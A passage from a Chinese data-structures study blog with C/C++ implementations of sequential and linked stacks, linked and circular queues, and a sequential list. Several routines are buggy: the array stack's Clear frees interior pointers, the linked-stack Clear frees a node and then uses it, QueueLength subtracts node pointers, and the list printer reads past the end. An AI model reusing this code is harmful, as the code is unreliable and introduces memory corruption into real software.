cout&lt;&lt;<span class="string">&quot;Init succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base&gt;=S.stacksize)&#123;</span><br><span class="line">        S.base=(SElemType*)<span class="built_in">realloc</span>(S.base, (S.stacksize+STACKINCREMENT)*<span class="built_in">sizeof</span>(SElemType));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!S.base) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S.top=S.base+S.stacksize;</span><br><span class="line">    S.stacksize+=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *S.top++=e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Push succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=*(S.top<span class="number">-1</span>);</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Pop succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S.top&gt;S.base)&#123;</span><br><span class="line">        SElemType* p=S.top;</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        S.stacksize-=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Stack clear succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.base != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="built_in">Clear</span>(S);</span><br><span class="line">        <span class="built_in">free</span>(S.base);</span><br><span class="line">        S.base = <span class="literal">NULL</span>;</span><br><span class="line">        S.top = <span class="literal">NULL</span>;</span><br><span class="line">        S.stacksize = <span class="number">0</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Stack destroyed.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.base==S.top) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(S.base==S.top)) <span class="keyword">return</span> S.top-S.base;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetTop</span><span class="params">(SqStack S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    e=*(S.top<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;e is:&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackTravers</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">StackEmpty</span>(S))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!(S.top==S.base))&#123;</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;. &quot;</span>;</span><br><span class="line">        cout&lt;&lt;(*(&amp;S.top))&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;(*(&amp;S.top))-&gt;b&lt;&lt;endl;</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqStack test;</span><br><span class="line">    SElemType e1;</span><br><span class="line">    e1=<span class="number">1</span>;</span><br><span class="line">    SElemType e2;</span><br><span class="line">    e2=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">InitStack</span>(test);</span><br><span class="line">    <span class="built_in">Push</span>(test, e1);</span><br><span class="line">    <span class="built_in">Push</span>(test, e2);</span><br><span class="line"> <span class="comment">/*   SElemType inputElem;</span></span><br><span class="line"><span class="comment">    int i=0,n;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;&quot;input number to input:&quot;;</span></span><br><span class="line"><span class="comment">    cin&gt;&gt;n;</span></span><br><span class="line"><span class="comment">    while (i&lt;n)&#123;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;&quot;inputElem.a:&quot;;</span></span><br><span class="line"><span class="comment">        cin&gt;&gt;inputElem.a;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;&quot;inputElem.b:&quot;;</span></span><br><span class="line"><span class="comment">        cin&gt;&gt;inputElem.b;</span></span><br><span class="line"><span class="comment">        i++;</span></span><br><span class="line"><span class="comment">        Push(test, inputElem);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">StackTravers</span>(test);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;the Stack&#x27;s length is:&quot;</span>&lt;&lt;<span class="built_in">StackLength</span>(test)&lt;&lt;endl;</span><br><span class="line">    SElemType e;</span><br><span class="line">    <span class="comment">//Pop(test,e);</span></span><br><span class="line">    <span class="comment">//cout&lt;&lt;&quot;Pop out e:&quot;&lt;&lt;e.a&lt;&lt;&quot;-&quot;&lt;&lt;e.b&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">GetTop</span>(test,e);</span><br><span class="line">   <span class="comment">// StackTravers(test);</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="链栈的存储实现和操作"><a href="#链栈的存储实现和操作" class="headerlink" title="链栈的存储实现和操作"></a>链栈的存储实现和操作</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SNode</span>&#123;</span><br><span class="line">    SElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">SNode</span> *next;</span><br><span class="line">&#125;SNode,*LinkStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(LinkStack &amp;S)</span></span>&#123;</span><br><span class="line">    S=(SNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SNode));</span><br><span class="line">    <span class="keyword">if</span>(!S) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(LinkStack &amp;S,SElemType e)</span></span>&#123;</span><br><span class="line">    SNode* p;</span><br><span class="line">    p=(SNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SNode));</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=S-&gt;next;</span><br><span class="line">    S-&gt;next=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(LinkStack &amp;S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    SNode* p;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;next==<span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    p=S-&gt;next;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">    S-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(LinkStack &amp;S)</span> </span>&#123;</span><br><span class="line">    SNode* p = S-&gt;next; <span class="comment">// 从头结点之后的第一个节点开始</span></span><br><span class="line">    SNode* q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q = p-&gt;next; <span class="comment">// 保存下一个节点的引用</span></span><br><span class="line">        <span class="built_in">free</span>(q); <span class="comment">// 释放当前节点</span></span><br><span class="line">        p = q; <span class="comment">// 移动到下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    S-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 清空后，将栈的头结点的下一个指针设为 NULL，表示空栈</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryStack</span><span class="params">(LinkStack &amp;S)</span></span>&#123;</span><br><span class="line">  <span class="built_in">Clear</span>(S);</span><br><span class="line">    <span class="built_in">free</span>(S);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h4><p>队列(Queue)是一种运算受限的特殊线性表，它只允许在表的一段进行插入，而在表的另一段进行删除</p><h4 id="队列抽象数据类型"><a href="#队列抽象数据类型" class="headerlink" title="队列抽象数据类型"></a>队列抽象数据类型</h4><p>ADT Queue{</p><p>​    数据对象：D={$a_i$|$a_i$ $\in$ElemSet ,i=1,2,…,n n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i \in D$,i=2,…,n}</p><p>​                        约定$a_1$为队列头$a_n$为队列尾</p><p>​    基本操作：</p><p>​        InitQueue(&amp;Q)    //初始化队列</p><p>​        DestoryQueue(&amp;Q)    //销毁队列</p><p>​        ClearQueue(&amp;Q)    //清空队列</p><p>​        QueueEmpty(Q)    //判断队列是否为空</p><p>​        QueueLength(Q)    //求队列长度</p><p>​        GetHead(Q,&amp;e)    //取队列头元素</p><p>​        EnQueue(&amp;Q,e)    //入队列</p><p>​        DeQueue(&amp;Q,&amp;e)    //出队列</p><p>​        QueueTraverse(Q,visit())    //遍历栈</p><p>}ADT Queue</p><h4 id="链队列存储实现"><a href="#链队列存储实现" class="headerlink" title="链队列存储实现"></a>链队列存储实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>  <span class="title class_">QNode</span>&#123;</span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><h4 id="链队列的操作实现"><a href="#链队列的操作实现" class="headerlink" title="链队列的操作实现"></a>链队列的操作实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>  <span class="title class_">QNode</span>&#123;</span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(QueuePtr)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(LinkQueue &amp;Q,QElemType e)</span></span>&#123;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    p=(QueuePtr)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    p=Q.front-&gt;next;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">    Q.front-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear=Q.front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;DeQueue succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;The Queue is empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//队列空</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Element exist.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//队列非空</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueLength</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Q.rear-Q.front;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueTravers</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Empty!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    QueuePtr p = Q.front-&gt;next;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt;i&lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;p-&gt;data&lt;&lt; endl;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClearQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        QueuePtr p = Q.front-&gt;next;</span><br><span class="line">        Q.front-&gt;next = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.rear = Q.front;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Clear succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ClearQueue</span>(Q);</span><br><span class="line">    <span class="built_in">free</span>(Q.front);</span><br><span class="line">   <span class="comment">// free(Q.rear); 不用再次释放同一地址了</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Destory succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetHead</span><span class="params">(LinkQueue Q,QElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        QueuePtr p= Q.front-&gt;next;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Empty!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    <span class="built_in">InitQueue</span>(Q);</span><br><span class="line">    <span class="type">int</span> test;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input Elem number:&quot;</span>;</span><br><span class="line">    cin&gt;&gt;test;</span><br><span class="line">    QElemType e;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;test;i++)&#123;</span><br><span class="line">        e=<span class="built_in">rand</span>();</span><br><span class="line">        <span class="built_in">EnQueue</span>(Q, e);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/* QElemType e1;</span></span><br><span class="line"><span class="comment">    e1.a=1;</span></span><br><span class="line"><span class="comment">    QElemType e2;</span></span><br><span class="line"><span class="comment">    e2.a=2;</span></span><br><span class="line"><span class="comment">    EnQueue(Q, e1);</span></span><br><span class="line"><span class="comment">    EnQueue(Q, e2);*/</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;the length is:&quot;</span>&lt;&lt;<span class="built_in">QueueLength</span>(Q)&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">QueueTravers</span>(Q);</span><br><span class="line">    QElemType ge;</span><br><span class="line">    <span class="built_in">GetHead</span>(Q, ge);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;ge is:&quot;</span>&lt;&lt;ge&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">DeQueue</span>(Q, ge);</span><br><span class="line">    <span class="built_in">QueueTravers</span>(Q);</span><br><span class="line">   <span class="comment">// ClearQueue(Q);</span></span><br><span class="line">   <span class="comment">// QueueTravers(Q);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//  cout&lt;&lt;&quot;the length is:&quot;&lt;&lt;QueueLength(Q)&lt;&lt;endl;</span></span><br><span class="line">  <span class="comment">//  DestoryQueue(Q);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h4><p>循环队列是顺序队列的特例，把顺序队列构造成一个首尾相连的循环表</p><p>存储实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  QElemType *base;</span><br><span class="line">  <span class="type">int</span> front;</span><br><span class="line">  <span class="type">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>循环队列空状态和满状态都满足Q.front==Q.rear</p><p>1.可以另设一个变量count记录队列中的元素个数，当为0时队列空；当为MASQSIZE时队列满</p><p>2.以头指针在队列尾指针的下一位置作为队列满的标志，牺牲一个存储空间 队满条件为：(sq.rear+1)% maxsize==sq.front</p><p>​     队空条件为：sq.rear==sq.front</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 线性表</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="线性表的定义和特点"><a href="#线性表的定义和特点" class="headerlink" title="线性表的定义和特点"></a>线性表的定义和特点</h3><h4 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h4><p>线性表是n个类型相同元素的有限序列，通常记作($a_1$,$a_2$,$a_3$,…,$a_n$)</p><h4 id="线性表的特点"><a href="#线性表的特点" class="headerlink" title="线性表的特点"></a>线性表的特点</h4><p>1.集合中必存在唯一的一个第一元素</p><p>2.集合中必存在唯一的一个最后元素</p><p>3.除最后元素之外，均有唯一的后继</p><p>4.除第一元素之外，均有唯一的前驱</p><h4 id="线性表的抽象数据类型描述"><a href="#线性表的抽象数据类型描述" class="headerlink" title="线性表的抽象数据类型描述"></a>线性表的抽象数据类型描述</h4><p>ADT List {</p><p>​    数据对象：D={$a_i$|$a_j$ $\in$ElemSet,i=1,2…,n,n$\geqslant$0}</p><p>​                            {称n为线性表的表长；</p><p>​                                称n=0时的线性表为空表}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i$ $\in$ D,i=2,3,…,n}</p><p>​    基本操作：</p><p>​            InitList(&amp;L)    //构造空线性表</p><p>​            DestoryList(&amp;L)   //销毁线性表L</p><p>​            ListEmpty(L)    //    判断L是否空</p><p>​            ListLength(L)    //求L长度</p><p>​            PriorElem(L,cur_e,&amp;pre_e)    //求前驱</p><p>​            NextElem(L,cur_e,&amp;next_e)    //求后继</p><p>​            GetElem(L,i,&amp;e)    //取i位置的值</p><p>​            PutElem(&amp;L,i,e)    //线性表赋值</p><p>​            LocateElem(L,e,compare())    //在线性表中查找e</p><p>​            ListTraverse(L,visit())     //遍历线性表</p><p>​            ClearList(&amp;L)    //清空线性表</p><p>​            ListInsert(&amp;L,i,e)     //在i位置插入e</p><p>​            ListDelete(&amp;L,i,&amp;e)    //删除i位置的元素</p><p>​    }ADT List</p><h3 id="线性表的顺序表示和实现"><a href="#线性表的顺序表示和实现" class="headerlink" title="线性表的顺序表示和实现"></a>线性表的顺序表示和实现</h3><h4 id="存储结构实现"><a href="#存储结构实现" class="headerlink" title="存储结构实现"></a>存储结构实现</h4><p>用一组地址连续的存储单元依次存放线性表中的数据元素</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">  <span class="type">int</span> listsize;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h4 id="基本操作实现"><a href="#基本操作实现" class="headerlink" title="基本操作实现"></a>基本操作实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype *elem;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    <span class="type">int</span> listsize;</span><br><span class="line">&#125;SqList;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList_Sq</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    L.elem=(Elemtype*)<span class="built_in">malloc</span>(LIST_INIT_SIZE*<span class="keyword">sizeof</span>(Elemtype));</span><br><span class="line">    <span class="keyword">if</span>(!L.elem)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    &#125;</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">    L.listsize=LIST_INIT_SIZE;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;InitList SqList successfully.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowList_Sq</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=L.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,L.elem[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DestoryList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(L.elem);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListEmpty</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L.length==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SqList is empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SqList is not empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PriorElem</span><span class="params">(SqList L,<span class="type">int</span> cur_e,Elemtype &amp;pre_e )</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur_e&lt;=<span class="number">0</span>||L.length==<span class="number">0</span>||cur_e&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pre_e=L.elem[cur_e<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span 